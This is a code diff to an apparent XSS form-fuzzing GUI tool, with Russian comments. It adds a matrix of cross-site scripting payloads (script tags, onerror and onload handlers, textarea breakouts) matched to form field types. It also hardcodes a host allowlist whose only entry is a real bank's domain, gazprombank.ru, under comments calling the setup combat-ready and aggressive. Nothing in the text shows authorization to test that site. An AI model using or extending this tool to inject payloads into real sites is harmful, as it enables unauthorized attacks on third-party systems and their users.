@@ -14,6 +14,51 @@ from xss_security_gui.utils.core_utils import normalize_url
 from xss_security_gui.utils.ui_queue_bridge import UIQueueBridge
 from xss_security_gui.utils.ai_bridge import analyze_async
 
+PAYLOAD_MATRIX = {
+    "text": [
+        "<script>alert(1)</script>",
+        "\"><img src=x onerror=alert(1)>",
+        "'\"><svg/onload=alert(1)>"
+    ],
+    "search": [
+        "<script>alert('search')</script>",
+        "\"><img src=x onerror=alert('search')>"
+    ],
+    "email": [
+        "test@example.com\"><img src=x onerror=alert('email')>",
+        "\" onfocus=alert('email') \""
+    ],
+    "password": [
+        "\" autofocus onfocus=alert('pwd') \"",
+        "' onkeyup=alert('pwd') '"
+    ],
+    "textarea": [
+        "<script>alert('textarea')</script>",
+        "</textarea><script>alert('break')</script>"
+    ],
+    "comment": [
+        "<!--><script>alert('comment')</script>"
+    ],
+    "default": [
+        "<script>alert('x')</script>",
+        "\"><img src=x onerror=alert('x')>"
+    ]
+}
+
+def select_payloads_for_input(inp: Dict[str, Any]) -> List[str]:
+    name = (inp.get("name") or "").lower()
+    type_ = (inp.get("type") or "").lower()
+
+    # Пріоритет: type → name → default
+    if type_ in PAYLOAD_MATRIX:
+        return PAYLOAD_MATRIX[type_]
+
+    for key in PAYLOAD_MATRIX:
+        if key in name:
+            return PAYLOAD_MATRIX[key]
+
+    return PAYLOAD_MATRIX["default"]
+
 
 class FormFuzzerTab(ttk.Frame, ThreatSenderMixin):
     """Агрессивный фуззер форм с многопоточностью и расширенными настройками"""
@@ -181,6 +226,7 @@ class FormFuzzerTab(ttk.Frame, ThreatSenderMixin):
 
             for form in forms:
                 if not isinstance(form, dict):
+                    self.log(f"⚠️ Пропущена невалидная форма #{form.get('id', 'unknown')}", "warning")
                     continue
                 
                 inputs = form.get("inputs", [])
@@ -320,71 +366,114 @@ class FormFuzzerTab(ttk.Frame, ThreatSenderMixin):
             )
 
     def _fuzz_single_form(self, form: Dict[str, Any], idx: int, total: int) -> List[Dict[str, Any]]:
-        """Фуззинг одной формы"""
+        """Фуззинг одной формы (боевой, с вайтлистом, маршрутом payload‑ов и осмысленным логированием)"""
         try:
-            action = form.get("action", "")
-            base_url = form.get("url", "")
-            
-            # Формируем полный URL
+            base_url = form.get("url", "").strip()
+            action = (form.get("action") or "").strip()
+
+            if not base_url:
+                return []
+
+            # --- Вайтлист по хосту ---
+            from urllib.parse import urlparse
+            allowed_hosts = {
+                "gazprombank.ru",
+                # добавляй свои разрешённые цели
+            }
+            host = urlparse(base_url).hostname
+            if host not in allowed_hosts:
+                self.log(f"⚠️ Пропуск формы: хост {host} не в вайтлисте", "warning")
+                return []
+
+            # --- Формируем полный URL ---
             if action.startswith(("http://", "https://")):
                 full_url = action
             elif action.startswith("/"):
                 full_url = base_url.rstrip("/") + action
             else:
-                full_url = base_url.rstrip("/") + "/" + action if action else base_url
-            
+                full_url = base_url.rstrip("/") + ("/" + action if action else "")
+
             full_url = normalize_url(full_url)
-            
+
             inputs = form.get("inputs", [])
             if not inputs:
+                self.log(f"⚠️ Форма без полей, пропуск: {full_url}", "warning")
                 return []
-            
-            method = form.get("method", "GET")
-            
-            # Определяем подозрительные поля
-            suspicious = [
-                i for i in inputs 
-                if any(x in i.lower() for x in ["query", "search", "msg", "comment", "text", "input", "data", "content"])
-            ]
-            
-            # Логируем информацию о форме
+
+            # --- Генерация пер‑параметрного маршрута payload‑ов ---
+            param_payloads = {}
+            for inp in inputs:
+                if not isinstance(inp, dict):
+                    continue
+                name = inp.get("name")
+                if not name:
+                    continue
+                param_payloads[name] = select_payloads_for_input(inp)
+
+            # Логируем маршрут
+            self.log("🧬 Маршрут payload‑ов:", "info")
+            for k, v in param_payloads.items():
+                self.log(f"   • {k}: {len(v)} payload‑ов", "info")
+
+            method = (form.get("method") or "GET").upper()
+
+            # --- Определяем подозрительные поля ---
+            suspicious: List[Dict[str, Any]] = []
+            for inp in inputs:
+                if not isinstance(inp, dict):
+                    continue
+                name = (inp.get("name") or "").lower()
+                type_ = (inp.get("type") or "").lower()
+                haystack = f"{name} {type_}"
+                if any(x in haystack for x in
+                       ["query", "search", "msg", "comment", "text", "input", "data", "content"]):
+                    suspicious.append(inp)
+
+            # --- Логируем информацию о форме ---
             self.log(f"\n📨 [{idx}/{total}] {method} {full_url}", "info")
             self.log(f"🔧 Параметры: {inputs}", "info")
             if suspicious:
                 self.log(f"⚠️ Подозрительные поля: {suspicious}", "warning")
             if form.get("handlers") and form.get("handlers") != "—":
                 self.log(f"🧠 JS обработчики: {form['handlers']}", "info")
-            
-            # Запускаем фуззинг с агрессивными настройками
+
+            # --- Боевые настройки ---
+            max_workers = self.max_workers if self.aggressive_mode else min(self.max_workers, 10)
+            timeout = self.timeout
+
+            # --- Запускаем фуззинг ---
             results = fuzz_form(
                 action_url=full_url,
                 method=method,
                 inputs=inputs,
-                max_workers=self.max_workers if self.aggressive_mode else 10,
-                timeout=self.timeout,
-                allowlist=None  # Можно добавить проверку allowlist
+                param_payloads=param_payloads,
+                max_workers=max_workers,
+                timeout=timeout,
+                allowlist=None
             )
-            
+
             hits = [r for r in results if r.get("vulnerable")]
-            
+
             if hits:
                 for hit in hits:
                     payload = hit.get("payload", "")
                     category = hit.get("category", "❓")
                     status = hit.get("status", "?")
-                    self.log(f"  ✔️ XSS НАЙДЕН: {payload[:60]}... [{category}] Status: {status}", "xss")
-                    # Run AI analysis for the hit asynchronously and append brief verdict
+                    self.log(f"  ✔️ XSS НАЙДЕН: {payload[:80]}... [{category}] Status: {status}", "xss")
+
+                    # AI-анализ
                     try:
                         def make_ai_cb(h):
                             def _ai_cb(res):
                                 try:
                                     summary = res.get("summary") if isinstance(res, dict) else str(res)
-                                    conf = res.get('confidence', res.get('confidence', '?')) if isinstance(res, dict) else '?'
+                                    conf = res.get("confidence", "?") if isinstance(res, dict) else "?"
                                     text = f"[AI] {summary} -- confidence={conf}\n"
                                     self._bridge.post_ui(self.result_box.insert, "end", text)
                                     self._bridge.post_ui(self.result_box.see, "end")
                                 except Exception:
                                     pass
+
                             return _ai_cb
 
                         analyze_async(hit, callback=make_ai_cb(hit), name="FormFuzzerAI")
@@ -392,9 +481,9 @@ class FormFuzzerTab(ttk.Frame, ThreatSenderMixin):
                         pass
             else:
                 self.log(f"  ❌ Уязвимость не найдена", "info")
-            
+
             return hits
-            
+
         except Exception as e:
             self.log(f"  ❌ Ошибка при фуззинге формы: {e}", "error")
             return []
